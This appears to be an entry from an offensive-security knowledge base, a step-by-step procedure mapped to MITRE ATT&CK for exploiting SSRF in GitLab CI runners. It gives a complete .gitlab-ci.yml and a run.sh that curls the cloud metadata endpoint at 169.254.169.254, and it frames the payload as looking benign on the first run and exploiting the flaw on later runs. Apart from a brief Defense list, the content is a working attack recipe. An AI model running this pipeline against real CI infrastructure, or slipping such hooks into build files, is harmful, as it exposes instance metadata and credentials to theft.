---
id: proc-uuid-1
tags:
  - ssrf
  - gitlab-ci
  - setup
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-fetch-digitalocean-metadata]]'
verified: false
platforms:
  - Cloud
  - Docker
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:09.572Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Setup-GitLab-CI-Pipeline-for-SSRF

## Summary

This procedure sets up a GitLab CI pipeline with a malicious .gitlab-ci.yml configuration and a run.sh script embedding an SSRF payload to target internal cloud metadata endpoints like DigitalOcean's metadata service.

## Description

In the context of exploiting SSRF in GitLab CI runners, create a repository with a .gitlab-ci.yml file defining test and pack stages using node:latest Docker image. The script installs npm dependencies, runs tests, makes run.sh executable, executes it (containing the SSRF curl), and packs the npm artifact. Cache node_modules and artifact .tgz files. The run.sh includes a curl to http://169.254.169.254/metadata/v1/ to fetch metadata on re-run. This setup appears benign on first run but exploits the vulnerability on subsequent runs, revealing internal resources.

## Requirements

1. GitLab account with repository creation permissions
2. Access to commit files to a GitLab project
3. Node.js environment in Docker for CI simulation

## Defense

Defensive measures and detection strategies:

- Validate and restrict CI pipeline scripts for outbound requests to metadata IPs
- Implement SSRF protections that persist across all build runs
- Monitor CI logs for suspicious curl commands targeting 169.254.169.254 or metadata services

## Objectives

1. Embed SSRF payload in CI pipeline without triggering initial protections
2. Prepare for re-run exploitation
3. Ensure pipeline executes scripts in a controlled Docker environment

## Instructions

### Step 1: Create .gitlab-ci.yml

**Context**: Define the CI pipeline stages to include script execution.

**Command** ([[commands/setup-gitlab-ci-yml]]):
No direct command; manually create the file with content:
```yaml
stages:
  - test
  - pack

node_test:
  image: node:latest
  stage: test
  cache:
    paths:
      - node_modules/
  script:
    - npm install
    - npm test
    - chmod +x run.sh
    - ./run.sh
  artifacts:
    paths:
      - run.sh

pack:
  image: node:latest
  stage: pack
  script:
    - npm pack
  artifacts:
    paths:
      - *.tgz
  cache:
    paths:
      - node_modules/
```

> This configures the pipeline to run the SSRF script during testing.

### Step 2: Create run.sh Script

**Context**: Embed the SSRF curl command to access metadata.

**Command** ([[commands/curl-fetch-digitalocean-metadata]]):
```bash
curl -L http://169.254.169.254/metadata/v1/
```

> Add this to run.sh and make it executable in the pipeline. Expected output on re-run: metadata paths like id, hostname.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetch-digitalocean-metadata]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- gitlab-ci
